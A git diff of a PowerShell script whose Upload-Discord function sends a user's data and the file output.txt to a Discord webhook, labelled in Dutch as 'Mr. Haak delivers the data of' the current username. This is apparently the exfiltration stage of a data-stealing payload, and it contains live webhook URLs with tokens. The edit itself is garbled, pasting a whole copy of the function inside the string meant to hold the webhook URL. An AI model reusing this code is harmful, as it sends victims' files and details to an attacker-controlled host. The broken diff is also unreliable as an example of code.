@@ -108,7 +108,31 @@ function Upload-Discord {
         [string]$text 
     )
     
-    $hookurl = 'https://discord.com/api/webhooks/1156610163462131783/0f1XmHXMhX3kZQcTK4iWg7eCo9SnBh3Vjj9ULk-Dn2iW9U7QKl7dRrc2YBYkpoKPzgTE'
+    $hookurl = '$dir = "C:\project"
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+    
+    $hookurl = 'https://discord.com/api/webhooks/1156861787602436147/rtoA_Id9Yc9TGm7lR9MGWWqfryBBvS9mRpShIdcvBw0AVOzwFvEk-UlOQ3bFRnKbKGad'
+    
+    $Body = @{
+      'username' = "Dhr. Haak levert u de gegevens van " + $env:username 
+      'content' = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))){
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+    
+    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+    }
+    
+    Upload-Discord -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"'
     
     $Body = @{
       'username' = "Dhr. Haak levert u de gegevens van " + $env:username 
